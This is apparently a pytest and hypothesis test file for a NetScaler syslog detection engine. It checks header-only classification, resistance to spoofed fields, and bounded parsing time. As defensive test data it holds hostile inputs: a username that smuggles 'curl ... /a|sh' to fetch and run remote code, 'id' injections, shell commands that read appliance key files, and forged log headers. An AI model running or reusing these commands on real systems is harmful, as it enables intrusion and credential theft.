"""Header-only syslog classification and spoof-resistant ns.log parsing (the live path)."""

import ipaddress
import re
import time
from datetime import UTC, date, datetime
from typing import get_args

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from scalar.detect.rules import ListMatcher, LogRule, RuleEngine, load_rules, parse_rule
from scalar.parse.nslog import (
    INJECTION_FIELD,
    SYSLOG_TAGS,
    LogEvent,
    SyslogSource,
    classify_syslog,
    extract_fields,
    parse_line,
    parse_nslog,
    parse_syslog,
)

RULES = load_rules()
LISTS = {
    "admin_networks": ListMatcher(["10.0.0.0/8"]),
    "admin_users": ListMatcher(["admin1", "nsroot", "sc_nitro"]),
}
SOURCES = set(get_args(SyslogSource))
ENVELOPE = "2026-10-05T10:00:01.123456+00:00 10.0.0.10 "  # rsyslog.py ScalarLine
ONBOX = re.compile(r"^(?P<ts>[A-Z][a-z]{2} +\d{1,2} \d{2}:\d{2}:\d{2}) <[^>]+> (?P<host>\S+) "
                   r"(?P<rest>.*)$")
TAGGED = re.compile(r"^(?P<tag>[\w-]+)(?:\[(?P<pid>\d+)\])?: (?P<body>.*)$")
NS = "2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default "
FAKE_NS = "2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default GUI CMD_EXECUTED 9 0 : "
ACCESS = '203.0.113.9 - - [05/Oct/2026:10:00:01 +0000] "GET /vpn/index.html HTTP/1.1" 200 1 "-" "{ua}"'


def framings(source: str, line: str) -> dict[str, str]:
    """The vector as rsyslog stores it, plus the native framings a NetScaler may send."""
    out = {"rsyslog": ENVELOPE + line}
    onbox = ONBOX.match(line)
    if onbox:
        out["rfc3164"] = f"{ENVELOPE}<134>{onbox['ts']} {onbox['host']} {onbox['rest']}"
        tagged = TAGGED.match(onbox["rest"])
        if source == "nslog":
            out["netscaler"] = f"{ENVELOPE}<134> {onbox['rest']}"
            out["rfc5424"] = f"{ENVELOPE}<134>1 2026-10-05T10:00:01Z ns-gw-01 - - - - {onbox['rest']}"
        elif tagged:
            out["rfc5424"] = (f"{ENVELOPE}<13>1 2026-10-05T10:00:01.5Z ns-gw-01 {tagged['tag']} "
                              f"{tagged['pid'] or '-'} - [meta sequenceId=\"7\"] {tagged['body']}")
    else:
        out["rfc5424"] = f"{ENVELOPE}<150>1 2026-10-05T10:00:01Z ns-gw-01 - - - - {line}"
        out["tagged"] = f"{ENVELOPE}<150>Oct  5 10:00:01 ns-gw-01 httpd[77]: {line}"
    return out


def fires(rule: LogRule, events: list[LogEvent]) -> bool:
    engine = RuleEngine([rule], LISTS)
    count = rule.threshold.count if rule.threshold else 1
    return any(hit.rule.id == rule.id for event in events * count
               for hit in engine.evaluate(event))


VECTORS = [pytest.param(rule, expected, source, line, kind, wrapped,
                        id=f"{rule.id}{'+' if expected else '-'}{index}-{kind}")
           for rule in RULES
           for expected, vectors in ((True, rule.tests_positive), (False, rule.tests_negative))
           for index, (source, line) in enumerate(vectors)
           for kind, wrapped in framings(source, line).items()]


@pytest.mark.parametrize(("rule", "expected", "source", "line", "kind", "wrapped"), VECTORS)
def test_live_classification_matches_declared_vector_source(
        rule: LogRule, expected: bool, source: str, line: str, kind: str, wrapped: str) -> None:
    classified, body = classify_syslog(wrapped + "\n")
    assert not rule.sources or classified in rule.sources, (kind, classified, wrapped)
    assert wrapped.endswith(body)
    hunted = fires(rule, [parse_line(source, line, "ns-gw-01")])
    live = fires(rule, [parse_syslog(wrapped, "ns-gw-01")])
    assert hunted == live == expected


def test_live_nslog_event_matches_hunt_parse() -> None:
    line = next(line for rule in RULES if rule.id == "mgmt-high-risk-command"
                for _source, line in rule.tests_positive)
    for wrapped in framings("nslog", line).values():
        live, hunted = parse_syslog(wrapped, "gw"), parse_line("nslog", line, "gw")
        assert (live.event_type, live.ts, live.seq, live.fields) == (
            hunted.event_type, hunted.ts, hunted.seq, hunted.fields)


@pytest.mark.parametrize("marker", [" sh[1]: x", " bash[99]: x", ";sh[0]:", " tcsh[2]: "])
def test_shell_tags_in_attacker_text_do_not_reroute_audit_lines(marker: str) -> None:
    by_id = {rule.id: rule for rule in RULES}
    cases = [
        ("cve-2026-88771-injected-command",
         f"default AAATM LOGIN_FAILED 7001 0 : User x NSPPE;id{marker} - Client_ip 203.0.113.9 - "
         'Failure_reason "Invalid credentials"'),
        ("cve-2025-5777-garbage-username",
         f'default AAA Message 4521 0 : "Authentication is rejected for \x89\x01{marker}"'),
        ("mgmt-key-access",
         'default CLI CMD_EXECUTED 960 0 : User nsroot - Remote_ip 198.51.100.7 - Command "shell '
         f'cat /flash/nsconfig/keys/updated/* #{marker}" - Status "Success"'),
        ("mgmt-from-unexpected-ip",
         f'default GUI CMD_EXECUTED 970 0 : User admin1{marker} - Remote_ip 198.51.100.7 - '
         'Command "show ns version" - Status "Success"'),
        ("gateway-password-spray",
         f"default AAATM LOGIN_FAILED 7101 0 : User j{marker} - Client_ip 203.0.113.9 - "
         'Failure_reason "Invalid credentials"'),
    ]
    for rule_id, message in cases:
        line = NS.removesuffix("default ") + message
        for wrapped in (ENVELOPE + "<134> " + line, ENVELOPE + "<local0.info> " + line):
            assert classify_syslog(wrapped)[0] == "nslog"
            assert fires(by_id[rule_id], [parse_syslog(wrapped, "ns-gw-01")]), (rule_id, wrapped)


@pytest.mark.parametrize("ua", [
    FAKE_NS + 'User admin1 - Remote_ip 10.0.0.1 - Command "add system user x" - Status "Success"',
    "x bash[1]: nobody on ? shell_command=\"cat /flash/nsconfig/keys/k\"",
    "0001/01/01:00:30:00 +01:00 h 0-PPE-0 : A B 1 0 : x",
    "2026/10/05:10:00:01 GMT h 0-PPE-0 : " + "A" * 300 + " B " + "9" * 5000 + " 0 : x",
])
def test_header_text_in_a_user_agent_cannot_forge_events(ua: str) -> None:
    for wrapped in framings("httpaccess", ACCESS.format(ua=ua)).values():
        event = parse_syslog(wrapped, "ns-gw-01")
        assert event.source == "httpaccess"
        assert event.event_type is None and event.fields == {}
        nslog_rules = [rule for rule in RULES if "nslog" in rule.sources]
        assert not any(fires(rule, [event]) for rule in nslog_rules)


@pytest.mark.parametrize(("line", "source"), [
    ("<38>Oct  5 10:00:01 ns-gw-01 sshd[812]: Accepted password for root from 203.0.113.9 "
     "port 4242 ssh2", "auth"),
    ("<38>Oct  5 10:00:01 ns-gw-01 sshd[812]: Invalid user bash[1]: from 203.0.113.9", "auth"),
    ("<38>1 2026-10-05T10:00:01Z ns-gw-01 sshd 812 - - Invalid user x 0-PPE-0 :", "auth"),
    ("<13>1 2026-10-05T10:00:01Z ns-gw-01 bash 4242 - - " + FAKE_NS + "x", "bashlog"),
    ("<13>1 2026-10-05T10:00:01Z ns-gw-01 /bin/sh 4242 - - nsroot on ? shell_command=\"id\"",
     "shlog"),
    ("<13>1 2026-10-05T10:00:01Z ns-gw-01 bash.log - - - x", "bashlog"),
    ("<11>Oct 5 10:00:01 ns-gw-01 kernel: pid 9 (NSPPE-00), uid 0: exited on signal 6 (core "
     "dumped)", "notice"),
    ("<150>1 2026-10-05T10:00:01Z ns-gw-01 httpaccess-vpn - - - " + ACCESS.format(ua="x"),
     "httpaccess-vpn"),
    ("<150>1 2026-10-05T10:00:01Z ns-gw-01 - - - - \xef\xbb\xbf" + ACCESS.format(ua="x"),
     "httpaccess"),
    ("<134>1 2026-10-05T10:00:01Z ns-gw-01 - - - - Oct  5 10:00:01 <local7.notice> ns-gw-01 "
     "bash[42]: nsroot on /dev/pts/0 shell_command=\"id\"", "bashlog"),
    ("<134>1 2026-10-05T10:00:01Z ns-gw-01 - - - - <local7.notice> ns-gw-01 bash[42]: x",
     "bashlog"),
    ("<14>Oct  5 10:00:01 ns-gw-01 nsvpnd[1]: tunnel " + FAKE_NS, "unknown"),
    ("<14>Oct  5 10:00:01 ns-gw-01 free text with sh[1]: inside", "unknown"),
    ("<131>Oct  6 10:00:00 adc nsaaad: login failed for x NSPPE;id", "nslog"),
    ("<131>1 2026-10-06T10:00:00Z adc nsaaad 77 - - login failed for x NSPPE;id", "nslog"),
    ("Oct 6 10:00:00 adc nsaaad: login failed for pitboss NSPPE-00;id; unexpectedly died",
     "nslog"),
    # RFC 5424 MSG under an unmapped APP-NAME: a tag-shaped word in the message is not a header
    ("<38>1 2026-10-05T10:00:01Z ns01 - - - - bash[1]: cat /flash/nsconfig/keys/k", "unknown"),
    ("<38>1 2026-10-05T10:00:01Z ns01 - - - - x bash[1]: cat /flash/nsconfig/keys/k", "unknown"),
    ("<38>1 2026-10-05T10:00:01Z ns01 nsvpnd 1 - - sshd[1]: Accepted password for root",
     "unknown"),
    ("<38>1 2026-10-05T10:00:01Z ns01 nsvpnd 1 - - jdoe sshd[1]: Accepted password for root",
     "unknown"),
    ("", "unknown"),
    ("garbage line", "unknown"),
])
def test_classification_uses_header_tokens_only(line: str, source: str) -> None:
    assert classify_syslog(ENVELOPE + line)[0] == source
    assert classify_syslog(line)[0] == source


@pytest.mark.parametrize("message", [
    "bash[1]: nobody on ? shell_command=\"cat /flash/nsconfig/keys/k\"",
    "x bash[1]: nobody on ? shell_command=\"cat /flash/nsconfig/keys/k\"",
    "jdoe sshd[1]: Accepted password for root from 203.0.113.9",
])
@pytest.mark.parametrize("app", ["-", "nsvpnd"])
def test_rfc5424_message_text_cannot_choose_the_source(app: str, message: str) -> None:
    event = parse_syslog(f"{ENVELOPE}<38>1 2026-10-05T10:00:01Z ns01 {app} 1 - - {message}", "gw")
    assert event.source == "unknown" and event.fields == {}
    assert not RuleEngine(RULES, LISTS).evaluate(event)


@pytest.mark.parametrize("line", [
    "<131>Oct  6 10:00:00 adc nsaaad: login failed for x NSPPE;curl -s http://203.0.113.9/a|sh",
    "<131>Oct  6 10:00:00 <local0.err> adc nsaaad[88]: login failed for x NSPPE;id",
    "<131>1 2026-10-06T10:00:00Z adc nsaaad 88 - - login failed for x NSPPE;curl -s "
    "http://203.0.113.9/a|sh",
])
def test_nsaaad_login_failures_reach_the_ns_log_rules(line: str) -> None:
    by_id = {rule.id: rule for rule in RULES}
    event = parse_syslog(ENVELOPE + line, "gw")
    assert event.source == "nslog" and event.event_type is None
    assert fires(by_id["cve-2026-88771-injected-command"], [event])


def test_nsaaad_text_cannot_forge_an_ns_log_audit_event() -> None:
    event = parse_syslog(ENVELOPE + "<131>Oct  6 10:00:00 adc nsaaad: " + FAKE_NS
                         + 'User admin1 - Remote_ip 10.0.0.1 - Command "add system user x" - '
                         'Status "Success"', "gw")
    assert event.source == "nslog" and event.event_type is None and event.fields == {}
    management = [rule for rule in RULES if rule.id.startswith("mgmt-")]
    assert not any(fires(rule, [event]) for rule in management)


def test_classifier_tag_table_covers_only_known_sources() -> None:
    assert set(SYSLOG_TAGS.values()) <= SOURCES - {"unknown"}


def test_unknown_lines_reach_only_source_agnostic_rules() -> None:
    event = parse_syslog(ENVELOPE + "<14>Oct  5 10:00:01 gw nsvpnd[1]: marker-x NSPPE;id", "gw")
    assert event.source == "unknown" and event.event_type is None
    assert not [hit for hit in RuleEngine(RULES, LISTS).evaluate(event)]
    agnostic = parse_rule({"id": "any", "title": "t", "severity": "low",
                           "match": {"raw_regex": "marker-x"},
                           "tests": {"positive": [{"line": "marker-x"}],
                                     "negative": [{"line": "y"}]}})
    assert fires(agnostic, [event])


def test_shell_body_is_parsed_from_rfc5424() -> None:
    event = parse_syslog(ENVELOPE + '<13>1 2026-10-05T10:00:01Z gw bash 7 - - nsroot on '
                         '/dev/pts/0 shell_command="cat /flash/nsconfig/keys/k"', "gw")
    assert (event.source, event.fields["User"], event.fields["Tty"]) == (
        "bashlog", "nsroot", "/dev/pts/0")
    assert event.message == event.fields["Command"] == "cat /flash/nsconfig/keys/k"


# --- field extraction ------------------------------------------------------------------------

def test_username_cannot_spoof_the_appended_client_ip() -> None:
    fields = extract_fields('User x - Client_ip 10.20.0.5 - Client_ip 203.0.113.9 - '
                            'Failure_reason "Invalid credentials"')
    assert fields["Client_ip"] == "203.0.113.9"
    assert fields["User"] == "x - Client_ip 10.20.0.5"
    assert fields[INJECTION_FIELD] == "Client_ip"


def test_management_login_username_cannot_spoof_remote_ip_or_status() -> None:
    user = 'x - Remote_ip 10.20.0.5 - Command "login x" - Status "Success"'
    escaped = user.replace('"', '\\"')
    line = (NS + f'API CMD_EXECUTED 990 0 : User {user} - Remote_ip 198.51.100.7 - '
            f'Command "login {escaped}" - Status "ERROR: Invalid username or password"')
    event = parse_nslog(line, "ns-gw-01")
    assert event.fields["Remote_ip"] == "198.51.100.7"
    assert event.fields["Status"].startswith("ERROR")
    assert event.fields["User"] == user
    assert set(event.fields[INJECTION_FIELD].split(",")) == {"Remote_ip", "Command", "Status"}
    by_id = {rule.id: rule for rule in RULES}
    assert fires(by_id["mgmt-from-unexpected-ip"], [event])
    assert fires(by_id["log-field-injection"], [event])
    engine = RuleEngine([by_id["mgmt-login-bruteforce"]], LISTS)
    hits = [hit for _ in range(5) for hit in engine.evaluate(event)]
    assert [hit.group for hit in hits] == [("198.51.100.7",)]


@pytest.mark.parametrize("feature", ["API", "GUI"])
def test_management_login_username_cannot_inject_command_or_status(feature: str) -> None:
    user = 'x - Command "add system user y" - Status "Success" -'
    escaped = user.replace('"', '\\"')
    line = (NS + f'{feature} CMD_EXECUTED 990 0 : User {user} - Remote_ip 198.51.100.7 - '
            f'Command "login {escaped}" - Status "ERROR: Invalid username or password"')
    event = parse_nslog(line, "ns-gw-01")
    assert event.fields["User"] == user
    assert event.fields["Command"] == f"login {escaped}"
    assert event.fields["Status"] == "ERROR: Invalid username or password"
    assert event.fields["Remote_ip"] == "198.51.100.7"
    assert set(event.fields[INJECTION_FIELD].split(",")) == {"Command", "Status"}
    by_id = {rule.id: rule for rule in RULES}
    assert not fires(by_id["mgmt-high-risk-command"], [event])
    engine = RuleEngine([by_id["mgmt-login-bruteforce"]], LISTS)
    hits = [hit for _ in range(5) for hit in engine.evaluate(event)]
    assert [hit.group for hit in hits] == [("198.51.100.7",)]


@pytest.mark.parametrize(("message", "key", "expected"), [
    ('User admin1 - Remote_ip 198.51.100.7 - Command "login x" - Status "Success" -" - Status '
     '"ERROR: Invalid username or password"', "Status", "ERROR: Invalid username or password"),
    ('User x - Failure_reason "None" - Failure_reason "Invalid credentials"', "Failure_reason",
     "Invalid credentials"),
])
def test_appliance_appended_trailing_fields_take_the_last_occurrence(
        message: str, key: str, expected: str) -> None:
    assert extract_fields(message)[key] == expected


def test_quoted_command_text_cannot_override_appended_fields() -> None:
    line = (NS + 'CLI CMD_EXECUTED 1 0 : User admin1 - Remote_ip 198.51.100.7 - Command "show '
            'x \\" - Remote_ip 10.0.0.1 - Status \\"Success" - Status "ERROR: denied"')
    fields = parse_nslog(line, "gw").fields
    assert fields["Remote_ip"] == "198.51.100.7" and fields["Status"] == "ERROR: denied"
    assert fields["Command"] == 'show x \\" - Remote_ip 10.0.0.1 - Status \\"Success'


def test_spray_threshold_groups_by_the_real_client_ip() -> None:
    rule = next(rule for rule in RULES if rule.id == "gateway-password-spray")
    engine = RuleEngine([rule], LISTS)
    hits = []
    for n in range(20):
        line = (NS + f"AAATM LOGIN_FAILED {n} 0 : User u - Client_ip 10.9.{n}.1 - Client_ip "
                '203.0.113.9 - Failure_reason "Invalid credentials"')
        hits += engine.evaluate(parse_syslog(ENVELOPE + "<134> " + line, "gw"))
    assert [hit.group for hit in hits] == [("203.0.113.9",)]


def test_ordinary_messages_have_no_injection_marker() -> None:
    for rule in RULES:
        forged = rule.tests_positive if rule.id == "log-field-injection" else ()
        for source, line in (*rule.tests_positive, *rule.tests_negative):
            marked = INJECTION_FIELD in parse_line(source, line, "gw").fields
            assert marked == ((source, line) in forged), line


def test_forged_fields_fire_the_log_field_injection_rule() -> None:
    rule = next(rule for rule in RULES if rule.id == "log-field-injection")
    engine = RuleEngine([rule], LISTS)
    spoofed = [NS + f"AAATM LOGIN_FAILED {n} 0 : User u - Client_ip 10.9.{n}.1 - Client_ip "
               '203.0.113.9 - Failure_reason "Invalid credentials"' for n in range(3)]
    status = (NS + 'GUI CMD_EXECUTED 9 0 : User x - Status "Success" - Remote_ip 198.51.100.7 - '
              'Command "login x" - Status "ERROR: Invalid username or password"')
    hits = [hit for line in [*spoofed, status]
            for hit in engine.evaluate(parse_syslog(ENVELOPE + "<134> " + line, "gw"))]
    assert [hit.event.fields[INJECTION_FIELD] for hit in hits] == ["Client_ip"] * 3 + ["Status"]
    # One key per forged field set: varying the forged values does not multiply alerts.
    assert len({hit.dedup_key for hit in hits}) == 2
    assert {hit.event.fields["Client_ip"] for hit in hits[:3]} == {"203.0.113.9"}


@pytest.mark.parametrize(("value", "expected"), [
    ("10.0.0.1:443", "10.0.0.1"), ("[2001:db8::1]:443", "2001:db8::1"), ("2001:db8::1", "2001:db8::1"),
    ('"Mapped Ip"', None), ("fe80::1%eth0", None), ("fe80::1%" + "a" * 80, None),
    ("1" * 70, None), ("::ffff:" + "0" * 70 + "1.2.3.4", None),
])
def test_ip_field_accepts_only_plain_addresses(value: str, expected: str | None) -> None:
    assert LogEvent("nslog", "d", "", fields={"Client_ip": value}).ip_field("Client_ip") == expected


def test_header_names_are_bounded() -> None:
    long = NS.removesuffix("default ") + "default " + "A" * 41 + " CMD_EXECUTED 1 0 : x"
    assert parse_nslog(long, "gw").event_type is None
    ok = NS.removesuffix("default ") + "default " + "A" * 40 + " " + "B" * 40 + " 1 0 : x"
    assert len(parse_nslog(ok, "gw").event_type or "") == 81


@pytest.mark.parametrize(("line", "zone"), [
    ("0001/01/01:00:30:00 +01:00 gw 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : x", "UTC"),
    ("9999/12/31:23:59:59 gw 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : x", "America/New_York"),
    ("2026/10/05:10:00:00 +99:99 gw 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : x", "UTC"),
    ("2026/13/45:99:99:99 gw 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : x", "UTC"),
    ("2026/10/05:10:00:00 gw 0-PPE-0 : default GUI CMD_EXECUTED 1 0 : x", "Not/AZone"),
])
def test_implausible_timestamps_are_dropped_not_raised(line: str, zone: str) -> None:
    event = parse_line("nslog", line, "gw", device_timezone=zone)
    assert event.event_type == "GUI CMD_EXECUTED" and event.ts is None


@pytest.mark.parametrize("text", [
    "User " + "x - " * 60000,
    ' - Command "' * 20000,
    "Authentication is rejected for " + " " * 200000 + "x",
    "shell_command=" + " " * 200000 + "x",
    "Status \\\"" * 30000,
    "<134>1 2026-10-05T10:00:01Z h a p m " + "[x" + ' a="\\]"' * 20000,
    "Oct  5 10:00:01 " + "a" * 250000 + " bash[1]: x",
], ids=["fake-users", "open-quotes", "rejected-spaces", "shell-spaces", "escaped-quotes",
        "open-structured-data", "long-host"])
def test_adversarial_lines_are_processed_in_bounded_time(text: str) -> None:
    started = time.perf_counter()
    for line in (text, NS + "AAATM LOGIN_FAILED 1 0 : " + text,
                 "Oct  5 10:00:01 <local7.notice> gw bash[1]: " + text):
        parse_syslog(ENVELOPE + line, "gw")
        for source in SOURCES:
            parse_line(source, line, "gw")
    assert time.perf_counter() - started < 5


# --- properties ------------------------------------------------------------------------------

LATIN1 = st.characters(max_codepoint=255)
FRAGMENTS = st.sampled_from([
    ENVELOPE, "<134>", "<13>1 ", "2026-10-05T10:00:01Z ", "Oct  5 10:00:01 ", "<local0.info> ",
    "ns-gw-01 ", "bash[1]: ", "sh: ", "sshd[2]: ", "pitboss: ", "- ", " - ", " : ", '"', "\\",
    "2026/10/05:10:00:01 ", "10/05/2026:10:00:01 ", "GMT ", "+01:00 ", "0-PPE-0 : ",
    "default ", "GUI ", "CMD_EXECUTED ", "1 ", "0 : ", "User ", "Client_ip ", "Remote_ip ",
    "SessionId: ", "Command ", "Status ", "Source ", "Nat_ip ", "Group(s) ", "fe80::1%x ",
    "203.0.113.9 ", "[2001:db8::1]:443 ", "[05/Oct/2026:10:00:01 +0000] ", '"GET / HTTP/1.1" ',
    "[Thu Oct 05 10:00:01 2026] [core:error] ", "[meta a=\"]\"] ", "\xef\xbb\xbf", "\x00", "\x89",
    "Authentication is rejected for ", "shell_command=",
])
LINES = st.one_of(st.text(LATIN1, max_size=400),
                  st.lists(st.one_of(FRAGMENTS, st.text(LATIN1, max_size=12)), max_size=40)
                  .map("".join))
ZONES = ["UTC", "America/New_York", "Asia/Kolkata", "Pacific/Kiritimati"]
ENGINE = RuleEngine(RULES, LISTS)


def _check(event: LogEvent) -> None:
    assert event.event_type is None or len(event.event_type) <= 81
    for name in event.fields:
        ip = event.ip_field(name)
        assert ip is None or (len(ip) <= 45 and str(ipaddress.ip_address(ip)) == ip)
    ENGINE.evaluate(event)


@settings(max_examples=400, deadline=None)
@given(LINES, st.sampled_from(["MMDDYYYY", "DDMMYYYY", "YYYYMMDD"]), st.sampled_from(ZONES))
def test_parsers_are_total_and_bounded(line: str, fmt: str, zone: str) -> None:
    source, body = classify_syslog(line)
    assert source in SOURCES and line.rstrip("\r\n").endswith(body)
    _check(parse_syslog(line, "gw", fmt, zone))
    for declared in SOURCES:
        _check(parse_line(declared, line, "gw", fmt, zone))


WORD = st.text(st.characters(min_codepoint=33, max_codepoint=126, exclude_characters='"\\'),
               min_size=1, max_size=20)


@settings(max_examples=300, deadline=None)
@given(feature=st.from_regex(r"[A-Z][A-Z0-9_]{0,39}", fullmatch=True),
       event=st.from_regex(r"[A-Za-z][A-Za-z0-9_]{0,39}", fullmatch=True),
       user=WORD, ip=st.ip_addresses().map(str), command=st.text(
           st.characters(min_codepoint=32, max_codepoint=126, exclude_characters='"\\'),
           max_size=40),
       day=st.dates(min_value=date(2000, 1, 2), max_value=date(2100, 12, 30)))
def test_well_formed_lines_round_trip(feature: str, event: str, user: str, ip: str,
                                      command: str, day: date) -> None:
    line = (f"{day:%Y/%m/%d}:10:00:01 GMT ns-gw-01 0-PPE-3 : default {feature} {event} 42 0 : "
            f'User {user} - Remote_ip {ip} - Command "{command}" - Status "Success"')
    for wrapped in (line, ENVELOPE + "<134> " + line, ENVELOPE + "<local0.info> " + line):
        parsed = parse_syslog(wrapped, "gw")
        assert (parsed.source, parsed.feature, parsed.event, parsed.seq) == (
            "nslog", feature, event, 42)
        assert parsed.ts == datetime(day.year, day.month, day.day, 10, 0, 1, tzinfo=UTC)
        assert parsed.fields["Remote_ip"] == ip and parsed.ip_field("Remote_ip") == ip
        assert parsed.fields["Command"] == command and parsed.fields["Status"] == "Success"
        assert parsed.fields["User"] == user
